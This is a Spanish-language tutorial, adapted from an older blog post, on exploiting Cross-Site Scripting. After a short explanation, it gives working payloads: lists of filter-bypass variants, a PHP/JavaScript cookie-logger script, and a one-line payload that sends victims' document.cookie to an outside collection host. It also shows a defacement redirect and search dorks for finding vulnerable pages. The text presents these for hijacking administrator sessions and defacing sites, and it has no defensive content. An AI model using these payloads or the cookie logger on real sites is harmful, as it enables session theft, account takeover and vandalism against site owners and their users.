---
description: >-
  La vulnerabilidad Cross Site Scripting está reconocida como la 7ª
  vulnerabilidad Web más importante según OWASP. Aquí aprenderemos qué es, como
  funciona y como explotarlo.
---

# A7-2017. XSS

{% hint style="info" %}
Este artículo es una actualización y adaptación del artículo de \[In]Seguridad Informática: **** [**Tutorial XSS**](https://calebbucker.blogspot.com/2012/06/tutorial-xss-cross-site-scripting.html)**.** Tambien he cogido contenido de otras fuentes para desarrollar la información y las explicaciones.
{% endhint %}

## **¿Qué es XSS?**

{% embed url="https://ciberseguridad.com/amenzas/vulnerabilidades/cross-site-scripting/" %}

El ataque Cross Site Scripting es una inyección de código malicioso, que se ejecutará en el navegador de la víctima. El script malicioso puede guardarse en el servidor web y ejecutarse cada vez que el usuario llama a la funcionalidad adecuada. También se puede realizar con los otros métodos, sin ningún script guardado en el servidor web.

El objetivo principal de este ataque es robar los datos de identidad del otro usuario: cookies, tokens de sesión y otra información. En la mayoría de los casos, este ataque se está utilizando para robar las cookies de la otra persona. Como sabemos, las cookies nos ayudan a iniciar sesión automáticamente. Por lo tanto, con las cookies robadas, podemos iniciar sesión con las otras identidades. Y esta es una de las razones por las cuales este ataque se considera uno de los más peligrosos.

El ataque XSS se está realizando en el lado del cliente. Se puede realizar con diferentes lenguajes de programación del lado del cliente. Sin embargo, la mayoría de las veces este ataque se realiza con Javascript y HTML.

## ¿Como se ejecuta el ataque?

{% embed url="https://ciberseguridad.com/amenzas/vulnerabilidades/cross-site-scripting/" %}

El ataque de Cross Site Scripting significa enviar e inyectar código o script malicioso. El código malicioso generalmente se escribe con lenguajes de programación del lado del cliente como Javascript, HTML, VBScript , Flash, etc. Javascript y HTML se utilizan principalmente para realizar este ataque.

Este ataque se puede realizar de diferentes maneras. Dependiendo del tipo de ataque XSS, el script malicioso puede reflejarse en el navegador de la víctima o almacenarse en la base de datos y ejecutarse cada vez, cuando el usuario llama a la función apropiada.

La razón principal de este ataque es la validación de entrada del usuario inapropiada, donde la entrada maliciosa puede entrar en la salida. Un usuario malintencionado puede ingresar un script, que se inyectará en el código del sitio web. Entonces el navegador no puede saber si el código ejecutado es malicioso o no.

Por lo tanto, se está ejecutando un script malicioso en el navegador de la víctima o se está mostrando cualquier forma falsa para los usuarios. Hay varias formas en que puede ocurrir un ataque XSS.

Las formas principales de Cross Site Scripting son las siguientes:

* Cross Site Scripting puede ocurrir en el script malicioso ejecutado en el lado del cliente.
* Página o formulario falso que se muestra al usuario (donde la víctima escribe credenciales o hace clic en un enlace malicioso).
* En los sitios web con anuncios mostrados.
* Correos electrónicos maliciosos enviados a la víctima.

Este ataque ocurre cuando el usuario malintencionado encuentra las partes vulnerables del sitio web y lo envía como entrada maliciosa apropiada. Se inyecta un script malicioso en el código y luego se envía como salida al usuario final.

## **XSS: MI PRIMER ATAQUE**

En esta sección voy a explicar cómo usar XSS para su ventaja. También vamos a lanzar nuestro primer ataque con XSS, si usted sabe los fundamentos a XSS, se puede omitir esta sección.

Ahora, nuestro primer paso, obviamente, es **encontrar un sitio vulnerable**. Encontrar un sitio vulnerable a XSS es mucho más fácil que encontrar un sitio vulnerable a SQLI. El problema es que puede tomar tiempo para determinar si el sitio es muy vulnerable. Con SQLI, basta con añadir un poco ". Sin embargo, en XSS, deberá presentar varias consultas, para poner a prueba un sitio para XSS.

Los sitios más vulnerables contendrán una búsqueda, inicio de sesión, o un área de Registro. Prácticamente en cualquier lugar que contenga un cuadro de texto, puede ser explotado con XSS.

&#x20;De todas formas, nuestro sitio debe tener algunos cuadros de texto a la entrada de algo de HTML.

&#x20;Por lo tanto, vamos a intentar poner la consulta básica de todos los tiempos:

```
<script>alert("XSS")</script>
```

Ese pequeño script, es HTML. Se hará un pequeño mensaje emergente, diciendo "XSS".&#x20;

Si no obtenemos el mensaje emergente es probable que la web tenga configurado un filtro.Un filtro, es cuando buscamos algo, entonces pasa por un proceso pequeño, básicamente, una inspección. Se comprueba si es malicioso. En este caso XSS.

A veces, estos filtros son muy débiles, y puede ser pasado por alto con mucha facilidad, también puede ser bastante difícil de bypassear. Hay un montón de formas de evitar un filtro XSS.&#x20;

En primer lugar, tenemos que averiguar que cosa esta bloqueando el filtro. Una gran parte del tiempo, se bloquea la alerta. He aquí un ejemplo de este tipo de filtro:

```
 <script>alert("XSS")</script>

>
<script>alert( > XSS DETECTED < )</script>
```

Se bloquean las comillas. Entonces, ¿cómo vamos a explotar la vulnerabilidad? Bueno, afortunadamente hay una manera de cifrar el mensaje completo .&#x20;

Nosotros vamos a usar una función que se llama "**String.fromCharCode**". El nombre de la misma más o menos lo explica todo. Cifra nuestro texto, en **ASCII**. Un ejemplo de este cifrado, sería así:

```
String.fromCharCode(88,83,83)
```

&#x20;Puede ser un poco confuso, pero muy sencillo. Esto es lo que nuestra consulta completa se verá así:

```
<script>alert(String.fromCharCode(88,83,83))</script>
```

&#x20;Así que vamos a poner de nuevo en la barra de búsqueda, y ¡Funcionó! Tenemos un cuadro de alerta diciendo "XSS"!&#x20;

Otras formas de Bypasear los filtros son las transformaciones, como estas:

```
 "><script>alert("XSS")</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
'><script>alert("XSS")</script>
'><script>alert(String.fromCharCode(88,83,83))</script>
<ScRIPt>aLeRT("XSS")</ScRIPt>
<ScRIPt<aLeRT(String.fromCharCode(88,83,83))</ScRIPt>
"><ScRIPt>aLeRT("XSS")</ScRIPt>
"><ScRIPt<aLeRT(String.fromCharCode(88,83,83))</ScRIPt>
'><ScRIPt>aLeRT("XSS")</ScRIPt>
'><ScRIPt<aLeRT(String.fromCharCode(88,83,83))</ScRIPt>
</script><script>alert("XSS")</script>
</script><script>alert(String.fromCharCode(88,83,83))</script>
"/><script>alert("XSS")</script>
"/><script>alert(String.fromCharCode(88,83,83))</script>
'/><script>alert("XSS")</script>
'/><script>alert(String.fromCharCode(88,83,83))</script>
</SCRIPT>"><SCRIPT>alert("XSS")</SCRIPT>
</SCRIPT>"><SCRIPT>alert(String.fromCharCode(88,83,83))
</SCRIPT>">"><SCRIPT>alert("XSS")</SCRIPT>
</SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
";alert("XSS");"
";alert(String.fromCharCode(88,83,83));"
';alert("XSS");'
';alert(String.fromCharCode(88,83,83));'
";alert("XSS")
";alert(String.fromCharCode(88,83,83))
';alert("XSS")
';alert(String.fromCharCode(88,83,83))
```

## **XSS: MÉTODOS AVANZADOS**

### **Cookie Stealing/Logging**

El **robo de cookies** es la cosa más dañino que podemos hacer con **XSS no persistentes**. Una cookie  registrará todas las cookies del usuario que accede a la página o a un documento determinado. La forma más sencilla de hacer esto, sería:

* En primer lugar, usted debe configurar un servidor.&#x20;
* Una vez que tenga su servidor, cree un nuevo archivo. Llámelo **CookieLog.txt** deje en blanco el código.&#x20;
* Cree otro archivo con el nombre "CookieLogger.php". En CookieLogger.php, tenemos que añadir algo de código, para que envíe las cookies que inician una sesión, en nuestra sesión de Cookies. Añadir este código:

```
<?php
/*
* Created on 16. april. 2007
* Created by Audun Larsen (audun@munio.no)
*
* Copyright 2006 Munio IT, Audun Larsen
*
*/
 
if(strlen($_SERVER['QUERY_STRING']) > 0) {
$fp=fopen('./CookieLog.txt', 'a');
fwrite($fp, urldecode($_SERVER['QUERY_STRING'])."\n");
fclose($fp);
} else {
?>
 
var ownUrl = 'http://<?php echo $_SERVER['HTTP_HOST']; ?><?php echo $_SERVER
['PHP_SELF']; ?>';
 
// ==
// URLEncode and URLDecode functions
//
// Copyright Albion Research Ltd. 2002
// http://www.albionresearch.com/
//
// You may copy these functions providing that
// (a) you leave this copyright notice intact, and
// (b) if you use these functions on a publicly accessible
// web site you include a credit somewhere on the web site
// with a link back to http://www.albionresearch.com/
//
// If you find or fix any bugs, please let us know at albionresearch.com
//
// SpecialThanks to Neelesh Thakur for being the first to
// report a bug in URLDecode() - now fixed 2003-02-19.
// And thanks to everyone else who has provided comments and suggestions.
// ==
function URLEncode(str)
{
// The Javascript escape and unescape functions do not correspond
// with what browsers actually do...
var SAFECHARS = "0123456789" + // Numeric
"ABCDEFGHIJKLMNOPQRSTUVWXYZ" + // Alphabetic
"abcdefghijklmnopqrstuvwxyz" +
"-_.!~*'()"; // RFC2396 Mark characters
var HEX = "0123456789ABCDEF";
 
var plaintext = str;
var encoded = "";
for (var i = 0; i < plaintext.length; i++ ) {
var ch = plaintext.charAt(i);
if (ch == " ") {
encoded += "+"; // x-www-urlencoded, rather than %20
} else if (SAFECHARS.indexOf(ch) != -1) {
encoded += ch;
} else {
var charCode = ch.charCodeAt(0);
if (charCode > 255) {
alert( "Unicode Character '"
+ ch
+ "' cannot be encoded using standard URL encoding.\n" +
"(URL encoding only supports 8-bit characters.)\n" +
"A space (+) will be substituted." );
encoded += "+";
} else {
encoded += "%";
encoded += HEX.charAt((charCode >> 4) & 0xF);
encoded += HEX.charAt(charCode & 0xF);
}
}
} // for
 
return encoded;
};
 
cookie = URLEncode(document.cookie);
html = '<img src="'+ownUrl+'?'+cookie+'">';
document.write(html);
 
< ?php
}
?>
```

* Ahora que tenemos nuestro script, podemos enviar el registrador de cookies a cualquier página vulnerable.&#x20;

&#x20;Esta es la secuencia de comandos que se iniciará el registro de las cookies.

```
<script>document.location="http://www.host.com/mysite/CookieLogger.php?cookie=
" + document.cookie;</script>
```

Una vez que obtenga la cookie, puede utilizar el addon de Firefox "**cookies Manager**" para manipular y editar las cookies para que pueda secuestrar la sesión de los administradores.

### **Defacing**

Defacing es una de las cosas más comunes que la gente le gusta hacer cuando no tienen acceso a las opciones de administrador múltiples. Sobre todo, para que puedan anunciarse a sí mismos, y simplemente dejar que el administrador sepa que su seguridad ha sido violada. De todas formas, defacear **requiere XSS persistentes**. Puede utilizar esta secuencia de comandos para redirigir a su página de deface:

```
<script>window.location="http://www.pastehtml.com/YOURDEFACEHERE/";</script>
```

### **OnMouseOver**

Onmousover no es una vulnerabilidad muy explotable. Se basa en realizar una acción cuando el puntero del raton pasa por encima de una posición concreta:

```
onmouseover=prompt1337
onmouseover=alert("XSS")
```

## **TECNICAS DE BYPASS DE FILTROS**

A veces una consulta sencilla de XSS simplemente no funciona. La razón de que su consulta no funciona, es porque el sitio tiene un sistema FAT o el filtro en su lugar.&#x20;

&#x20;Hay muchas maneras de pasar por los filtros XSS:

### **Hex Bypassing**

Con caracteres bloqueados como >,<  y  / es muy difícil de ejecutar una consulta de XSS pero siempre hay una solución. Puede cambiar sus caracteres, por su representación en hexadecimal. Estos pueden serle de ayuda:

```
> = %3c 
< = %3c 
/ = %2f
```

### **ASCII Bypassing**

Con una codificación ASCII, podemos utilizar el carácter  " que es bloqueado por casi todos los filtros XSS. Utilizando el comando de codificación ASCII obtenemos:

```
NO FUNCIONA EL SCRIPT:
<script>alert("XSS")</script>

FUNCIONA EL SCRIPT:
<script>alert(String.fromCharCode(88,83,83))</script>
```

### **Case-Sensitive Bypassing**

Este tipo de derivación rara vez funciona, pero siempre vale la pena un tiro. Algunos filtros se establecen en el lugar para detectar ciertas cadenas, sin embargo, las cadenas del filtro que se bloquean suelen diferenciar entre mayúsculas y minúsculas. Así que todo lo que tenemos que hacer, es ejecutar un script, con diferentes tamaños de caracteres hasta que encontremos la combinación que no está bloquada, ejemplo:

```
<ScRiPt>aLeRt("XSS")</ScRiPt>
```

Usted también puede mezclar eso con cifrado ASCII. Este tipo de derivación sólo funciona en los filtros realmente muy viejos.

### **Algunos Dorks XSS**

```
inurl:search.php?
inurl:find.php?
inurl:search.html
inurl:find.html
inurl:search.aspx
inurl:find.aspx
```
